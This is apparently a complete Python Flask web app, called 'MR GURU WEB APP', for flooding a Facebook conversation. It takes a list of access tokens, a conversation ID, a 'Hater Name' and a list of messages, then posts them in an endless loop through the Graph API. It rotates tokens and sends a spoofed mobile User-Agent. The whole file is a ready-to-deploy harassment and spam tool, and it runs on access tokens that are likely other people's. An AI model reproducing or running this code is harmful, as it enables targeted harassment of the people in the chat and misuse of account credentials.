import requests
import threading
import time
import os
from flask import Flask, render_template_string, request, redirect, jsonify

app = Flask(__name__)
data = {"status": "OFFLINE", "logs": [], "total_sent": 0}

def send_messages_logic(tokens, convo_id, messages, haters_name, speed):
    global data
    data["status"] = "RUNNING"
    num_tokens = len(tokens)
    num_messages = len(messages)

    headers = {
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9)',
        'referer': 'www.google.com'
    }

    # Session use karne se delivery line-by-line aur stable ho jati hai
    session = requests.Session()

    while data["status"] == "RUNNING":
        try:
            for message_index in range(num_messages):
                if data["status"] != "RUNNING":
                    break
                
                token_index = message_index % num_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()

                clean_id = convo_id.replace('t_', '').strip()
                url = f"https://graph.facebook.com/v15.0/t_{clean_id}/"
                
                parameters = {
                    'access_token': access_token, 
                    'message': f"{haters_name} {message}"
                }
                
                # Single request at a time
                response = session.post(url, json=parameters, headers=headers)
                current_time = time.strftime("%I:%M:%S %p")

                if response.ok:
                    data["total_sent"] += 1
                    data["logs"].insert(0, f"<span style='color: #0f0;'>[+] Sent: {data['total_sent']} | Msg: {message_index + 1} | Time: {current_time}</span>")
                else:
                    data["logs"].insert(0, f"<span style='color: #f00;'>[x] Failed Msg {message_index + 1} | Error: {response.text}</span>")
                
                # Sahi synchronization ke liye wait
                time.sleep(int(speed))
            
            data["logs"].insert(0, "<span style='color: #00f;'>[!] Cycle Complete. Restarting...</span>")
        except Exception as e:
            data["logs"].insert(0, f"[!] Error: {str(e)}")
            time.sleep(10)

HTML_UI = '''
<!DOCTYPE html>
<html>
<head>
    <title>MR GURU WEB APP</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; }
        .box { border: 2px solid #0f0; border-radius: 15px; padding: 20px; max-width: 450px; margin: 20px auto; box-shadow: 0 0 15px #0f0; }
        textarea, input { width: 90%; background: #111; color: #0f0; border: 1px solid #0f0; margin: 5px; padding: 10px; border-radius: 5px; outline: none; }
        button { width: 95%; padding: 15px; background: #0f0; color: #000; font-weight: bold; border: none; cursor: pointer; border-radius: 10px; margin-top: 10px; }
        .stop-btn { background: #f00; color: #fff; box-shadow: 0 0 10px #f00; }
        #logs { height: 250px; overflow-y: auto; background: #050505; text-align: left; padding: 10px; margin-top: 15px; font-size: 12px; border: 1px solid #333; }
    </style>
</head>
<body>
    <div class="box">
        <h1 style="text-shadow: 0 0 10px #0f0;">MR GURU WEB APP</h1>
        <div id="stat" style="font-size: 20px;">STATUS: OFFLINE</div>
        <form method="POST" action="/start">
            <textarea name="tks" placeholder="Tokens (One per line)" rows="3" required></textarea>
            <input name="id" placeholder="Convo ID" required>
            <input name="hater" placeholder="Hater Name">
            <textarea name="msgs" placeholder="Messages (One per line)" rows="5" required></textarea>
            <input name="spd" type="number" value="30" placeholder="Speed in seconds">
            <button type="submit">ACTIVATE ENGINE</button>
        </form>
        <form method="POST" action="/stop">
            <button type="submit" class="stop-btn">STOP SERVER</button>
        </form>
        <div id="logs">>> Engine Ready...</div>
    </div>
    <script>
        setInterval(() => {
            fetch('/status').then(r => r.json()).then(d => {
                document.getElementById('stat').innerText = "SENT: " + d.total_sent + " | " + d.status;
                document.getElementById('logs').innerHTML = d.logs.join("<br>");
            });
        }, 2000);
    </script>
</body>
</html>
'''

@app.route('/')
def home(): return render_template_string(HTML_UI)

@app.route('/status')
def status(): return jsonify(data)

@app.route('/start', methods=['POST'])
def start():
    if data["status"] != "RUNNING":
        tks = request.form['tks'].split('\n')
        msgs = request.form['msgs'].split('\n')
        threading.Thread(target=send_messages_logic, args=(tks, request.form['id'], msgs, request.form['hater'], request.form['spd']), daemon=True).start()
    return redirect('/')

@app.route('/stop', methods=['POST'])
def stop():
    data["status"] = "OFFLINE"
    return redirect('/')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
